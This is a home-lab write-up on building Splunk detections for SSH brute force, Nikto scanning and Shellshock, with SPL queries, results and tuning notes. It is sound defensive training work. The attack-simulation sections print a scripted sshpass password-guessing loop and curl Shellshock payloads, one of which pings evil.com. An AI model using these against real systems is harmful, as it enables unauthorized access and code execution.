# Project 2: SIEM Lab (Splunk) — Stage 3: Detection Engineering (FINAL STAGE)

## Overview

With the Universal Forwarder pipeline validated end-to-end in Stage 2 (Apache access/error logs and Linux auth logs flowing cleanly from `apache-web-01` into `splunk-siem-01`), Stage 3 focused on building, testing, and validating three detection use cases against real, self-generated attack traffic. Each detection follows the same pattern: raw log parsing via `rex`/`regex`, aggregation with `stats`, a defined threshold, and a saved scheduled alert — mirroring how a production SOC would build and operationalize a detection rule.

This is the final stage of Project 2. All three planned detections are complete, tested against live attack traffic from a Kali VM, and saved as recurring Splunk alerts.

**Environment:**
- `splunk-siem-01` (192.168.208.40) — Splunk Enterprise 10.4.2
- `apache-web-01` (192.168.208.10) — Universal Forwarder, log source
- Kali VM (192.168.208.30) — attack traffic generator
- Host-only network segment: 192.168.208.0/24

---

## Detection 1: SSH Brute-Force

**MITRE ATT&CK:** T1110 – Brute Force → T1110.001 – Password Guessing

### Background
SSH brute-force attacks attempt to guess valid credentials through repeated login attempts. The key signal isn't a single failed login (which happens legitimately all the time) — it's an abnormal *volume* of failures from a single source in a short window.

### Simulated Attack Traffic
Generated failed SSH login attempts from Kali against `apache-web-01` (192.168.208.10) using `sshpass` to script repeated wrong-password attempts:

```bash
apt update && apt install sshpass -y

for i in {1..15}; do
  sshpass -p "wrongpassword$i" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 marshel@192.168.208.10 exit
done
```

### Field Extraction
Splunk's default `linux_secure` sourcetype extraction did not parse this system's `sshd-session[...]` log format, so fields were extracted manually with `rex`:

```spl
index=linux_auth "Failed password"
| rex field=_raw "Failed password for (invalid user )?(?<sshuser>\S+) from (?<src_ip>[\d\.]+) port (?<src_port>\d+)"
| table _time, sshuser, src_ip, src_port
```

### Detection Query
```spl
index=linux_auth "Failed password" earliest=-15m latest=now
| rex field=_raw "Failed password for (invalid user )?(?<sshuser>\S+) from (?<src_ip>[\d\.]+) port (?<src_port>\d+)"
| stats count as failed_attempts, values(sshuser) as attempted_users, earliest(_time) as first_attempt, latest(_time) as last_attempt by src_ip
| where failed_attempts >= 5
| convert ctime(first_attempt) ctime(last_attempt)
```

Aggregates failed logins per source IP within a rolling 15-minute window and flags any source crossing a 5-attempt threshold. `values(sshuser)` also surfaces whether the attacker is spraying multiple usernames or hammering one account.

### Results
| src_ip | failed_attempts | attempted_users | window |
|---|---|---|---|
| 192.168.208.30 | 8 | marshel | ~24 seconds |

8 failed logins in ~24 seconds is well outside normal human typing cadence — a clear automation signature.

### Alert
Saved as `ssh brute force - failed login threshold`, scheduled via cron, 15-minute rolling search window, "Add to Triggered Alerts" action.

### Tuning Notes
A legitimate user who forgets their password a couple of times could approach a low threshold — in a real environment, the threshold and window would be tuned against a baseline of normal failed-login volume before deployment.

---

## Detection 2: Web Scanner / Recon (Nikto)

**MITRE ATT&CK:** T1595 – Active Scanning → T1595.002 – Vulnerability Scanning

### Background
Automated scanners like Nikto probe a large number of known/common paths in rapid succession, most of which don't exist on the target — producing a distinctive combination of high request volume, high path diversity, and a high 404 rate from a single source.

### Simulated Attack Traffic
```bash
nikto -h http://192.168.208.10
```

### Field Extraction
Apache combined log format was not auto-extracted under the custom `apache:access` sourcetype, so fields were pulled via `rex`:

```spl
index=apache_web sourcetype=apache:access
| rex field=_raw "^(?<clientip>\S+) \S+ \S+ \[(?<req_time>[^\]]+)\] \"(?<method>\S+) (?<uri_path>\S+) \S+\" (?<status>\d+) (?<bytes>\d+) \"[^\"]*\" \"(?<useragent>[^\"]*)\""
```

### Detection Query
```spl
index=apache_web sourcetype=apache:access
| rex field=_raw "^(?<clientip>\S+) \S+ \S+ \[(?<req_time>[^\]]+)\] \"(?<method>\S+) (?<uri_path>\S+) \S+\" (?<status>\d+) (?<bytes>\d+) \"[^\"]*\" \"(?<useragent>[^\"]*)\""
| stats count as total_requests, dc(uri_path) as unique_paths, count(eval(status=404)) as not_found_count, earliest(_time) as first_seen, latest(_time) as last_seen by clientip
| eval not_found_ratio = round(not_found_count / total_requests, 2)
| where unique_paths > 20 AND not_found_ratio > 0.5
| convert ctime(first_seen) ctime(last_seen)
```

Flags a source only when it hits **more than 20 distinct paths** *and* **over half return 404** — combining both conditions filters out legitimate high-traffic sources (e.g., a user refreshing one page) that would otherwise trip a single-metric threshold.

### Results
| clientip | total_requests | unique_paths | not_found_ratio | window |
|---|---|---|---|---|
| 192.168.208.30 | 8,281 | 7,752 | 0.96 | 09:30:32 – 09:36:16 (~5m 44s) |

7,752 distinct paths with a 96% not-found rate in under 6 minutes — no legitimate browsing pattern produces this signature.

### Alert
Saved as `Web Scanner - High 404 Recon Detection`, scheduled via cron, 15-minute rolling search window, "Add to Triggered Alerts" action.

### Tuning Notes
A legitimate crawler (search engine bot) could trigger the same path-diversity threshold. Production tuning should cross-reference `useragent` against a known-bot allowlist, or calibrate the threshold against real site traffic volume.

---

## Detection 3: Shellshock Exploit Attempt (CVE-2014-6271)

**MITRE ATT&CK:** T1190 – Exploit Public-Facing Application

### Background
Shellshock is a parsing flaw in Bash: when Bash imports an environment variable formatted as a function definition, a bug in versions prior to the patch causes it to keep executing anything appended after the closing brace as a live shell command, instead of stopping at the end of the function. On CGI-backed web servers, HTTP headers (`User-Agent`, `Referer`, `Cookie`, etc.) are commonly passed into environment variables before a Bash process is invoked — giving an attacker remote code execution via a single crafted HTTP request, with no authentication required. The payload signature is unmistakable:

```
() { :; };
```

### Simulated Attack Traffic
Sent the payload through three different header vectors, since a real attacker will try multiple headers to find one that reaches vulnerable CGI code:

```bash
curl -s -A "() { :;}; echo VULNERABLE-TEST" http://192.168.208.10/cgi-bin/test.cgi -o /dev/null
curl -s -A "() { :;}; /bin/bash -c 'id'" http://192.168.208.10/cgi-bin/status -o /dev/null
curl -s -H "Referer: () { :;}; echo PWNED" http://192.168.208.10/cgi-bin/status -o /dev/null
curl -s -H "Cookie: () { :;}; ping -c1 evil.com" http://192.168.208.10/ -o /dev/null
```

All four requests returned HTTP 404 — this Apache install has no vulnerable CGI script exposed, so no code execution occurred. This validated the **detection layer** rather than actual exploitation, which is the correct and safe way to test this in a lab that shouldn't be genuinely compromised.

### Detection Query
```spl
index=apache_web sourcetype=apache:access
| regex _raw="\(\)\s*\{\s*:;\s*\}"
| rex field=_raw "^(?<clientip>\S+) \S+ \S+ \[(?<req_time>[^\]]+)\] \"(?<method>\S+) (?<uri_path>\S+) \S+\" (?<status>\d+) (?<bytes>\d+) \"(?<referer>[^\"]*)\" \"(?<useragent>[^\"]*)\""
| stats count as exploit_attempts, values(uri_path) as targeted_paths, earliest(_time) as first_attempt, latest(_time) as last_attempt by clientip
| convert ctime(first_attempt) ctime(last_attempt)
```

The `regex` match is applied against the full raw event text rather than one specific field, so it catches the payload regardless of which header carried it. Whitespace-tolerant matching (`\s*`) also guards against trivial evasion via extra spacing in the payload.

### Results
| clientip | exploit_attempts | targeted_paths | window |
|---|---|---|---|
| 192.168.208.30 | 4 | /cgi-bin/test.cgi, /cgi-bin/status, / | ~16 seconds |

All 4 payload variants were correctly detected and attributed to the source IP, across all three injection vectors (User-Agent, Referer, Cookie).

### Alert
Saved as `Shellshock - Exploit Attempt Detection`, scheduled via cron, 15-minute rolling search window, "Add to Triggered Alerts" action.

### Alert Validation
Beyond confirming the query logic manually, the saved alert was left running on its hourly schedule and observed firing on its own, unattended:

- **Trigger History:** fired at `2026-09-08 10:00:00 UTC`, matching its scheduled cron run
- **Matched result:** `192.168.208.30`, 3 exploit attempts, targeting `/cgi-bin/status` and `/cgi-bin/test.cgi`, window `09:45:19–09:45:35`

This run captured 3 of the 4 original test payloads (the 4th, at `09:44:45`, fell just outside this particular 15-minute lookback window) — expected behavior for a rolling-window detection, and confirms the alert is genuinely evaluating on schedule rather than only working when manually re-run.

### Tuning Notes
Since this detection matches on payload signature regardless of outcome, a production deployment should additionally weight or escalate on response codes other than 404 (2xx/5xx) against CGI-adjacent paths — a non-404 response combined with this signature would indicate an actually vulnerable endpoint and warrants immediate escalation over a routine alert.

---

## Project 2 Summary

| Detection | Source Log | Threshold Logic | Result | Status |
|---|---|---|---|---|
| SSH Brute-Force | linux_auth | ≥5 failed logins / src IP / 15min | 8 attempts, 24s window | ✅ Detected, alerted |
| Web Scanner/Recon | apache_web | >20 unique paths AND >50% 404 rate | 7,752 paths, 96% 404 | ✅ Detected, alerted |
| Shellshock Exploit | apache_web | Raw regex match on `() { :; };` | 4/4 payloads, 3 vectors | ✅ Detected, alerted |

All three detections were built on the Splunk pipeline rebuilt in Stage 2, validated against live, self-generated attack traffic from a dedicated Kali VM, and saved as recurring scheduled alerts with defined trigger actions. Each detection is mapped to its corresponding MITRE ATT&CK technique.

**Project 2 (SIEM Lab / Splunk) is now COMPLETE.**

Next: update the portfolio tracker and move to Project 3 of the 5-project expansion.